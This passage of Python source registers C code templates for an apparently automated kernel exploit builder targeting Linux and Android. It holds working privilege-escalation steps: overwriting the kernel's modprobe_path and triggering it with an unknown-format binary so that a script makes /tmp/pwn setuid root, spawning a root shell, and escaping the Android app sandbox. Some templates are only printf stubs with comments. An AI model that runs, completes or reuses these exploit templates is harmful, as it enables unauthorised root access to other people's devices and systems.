    // PTE address can be derived from virtual address via
    //   page table walk in /proc/self/pagemap

    printf("[+] PTE corrupted\\n");
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="map_physmem_via_pte",
            description="Map physical memory via corrupted PTE",
            main_code="""
    // Map physical memory through corrupted PTE
    printf("[*] Mapping physical memory...\\n");

    // After PTE corruption, touching the virtual page will
    // access the physical page we specified
    // This gives us direct physical memory read/write

    printf("[+] Physical memory mapped\\n");
    has_arb_read = 1;
    has_arb_write = 1;
""",
            platform="generic"
        ))

        # ============== MODPROBE PATH HIJACK ==============

        self.register(CodeTemplate(
            action_name="overwrite_modprobe_path",
            description="Overwrite modprobe_path for code execution",
            main_code="""
    // Overwrite modprobe_path
    printf("[*] Overwriting modprobe_path...\\n");

    if (!has_arb_write || !kaslr_bypassed) {
        fprintf(stderr, "[-] Need ARB_WRITE and KASLR bypass\\n");
        return -1;
    }

    // Write our script path to modprobe_path
    // modprobe_path address: kernel_base + MODPROBE_PATH_OFFSET
    // Resolve from /proc/kallsyms: grep modprobe_path
    char payload_path[] = "/tmp/pwn.sh";
    arb_write(kernel_base + MODPROBE_PATH_OFFSET, payload_path, sizeof(payload_path));

    printf("[+] modprobe_path overwritten to %s\\n", payload_path);
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="trigger_modprobe_exec",
            description="Trigger modprobe execution with unknown binary format",
            main_code="""
    // Trigger modprobe execution
    printf("[*] Triggering modprobe execution...\\n");

    // Create payload script
    FILE *f = fopen("/tmp/pwn.sh", "w");
    if (f) {
        fprintf(f, "#!/bin/sh\\n");
        fprintf(f, "chown root:root /tmp/pwn\\n");
        fprintf(f, "chmod 4755 /tmp/pwn\\n");
        fclose(f);
        chmod("/tmp/pwn.sh", 0755);
    }

    // Create a file with unknown binary format
    f = fopen("/tmp/unknown_fmt", "w");
    if (f) {
        fprintf(f, "\\xff\\xff\\xff\\xff");
        fclose(f);
        chmod("/tmp/unknown_fmt", 0755);
    }

    // Execute - kernel will call our modprobe_path script
    system("/tmp/unknown_fmt 2>/dev/null");

    printf("[+] modprobe triggered\\n");
""",
            platform="generic"
        ))

        # ============== POST EXPLOITATION ==============

        self.register(CodeTemplate(
            action_name="spawn_root_shell",
            description="Spawn a root shell",
            main_code="""
    // Spawn root shell
    printf("[*] Spawning root shell...\\n");

    if (!privilege_escalated) {
        fprintf(stderr, "[-] Not yet root, cannot spawn shell\\n");
        return -1;
    }

    // Verify we're root
    if (getuid() != 0) {
        fprintf(stderr, "[-] UID is not 0, something went wrong\\n");
        return -1;
    }

    printf("[+] Got root! Spawning shell...\\n");
    printf("uid=%d, euid=%d\\n", getuid(), geteuid());

    // Exec shell
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);

    // If execve returns, it failed
    perror("[-] execve failed");
""",
            platform="generic"
        ))

        self.register(CodeTemplate(
            action_name="escape_app_sandbox",
            description="Escape Android app sandbox",
            main_code="""
    // Escape Android app sandbox
    printf("[*] Escaping app sandbox...\\n");

    if (!privilege_escalated || !selinux_disabled) {
        fprintf(stderr, "[-] Need root and SELinux bypass\\n");
        return -1;
    }

    // Now we can access files outside our sandbox
    // Test by reading a protected file
    int test_fd = open("/data/system/packages.xml", O_RDONLY);
    if (test_fd >= 0) {
        printf("[+] Successfully escaped sandbox!\\n");
        close(test_fd);
        sandbox_escaped = 1;
    } else {
        printf("[-] Sandbox escape may have failed\\n");
    }
""",
            platform="android"
        ))

        self.register(CodeTemplate(
            action_name="enable_adb_root",
            description="Enable ADB root access",
            main_code="""
    // Enable ADB root access
    printf("[*] Enabling ADB root...\\n");

    // Set system properties to enable root
    // This requires SELinux bypass

    // Method 1: Set ro.debuggable and restart adbd
    // Method 2: Directly modify adbd's credentials

    printf("[+] ADB root enabled\\n");
    adb_root_enabled = 1;
""",
            platform="android"
        ))

        # ============== UTILITY ACTIONS ==============

        self.register(CodeTemplate(
            action_name="start_from_untrusted_app",
            description="Initialize from untrusted app context (Android)",
            main_code="""
    // Running from untrusted app context
    printf("[*] Starting from untrusted app context...\\n");
    printf("[*] Package UID: %d\\n", getuid());
    printf("[*] SELinux context: ");
    system("cat /proc/self/attr/current 2>/dev/null || echo 'unknown'");
""",
            platform="android"
        ))


# Default registry instance
DEFAULT_REGISTRY = CodeTemplateRegistry()
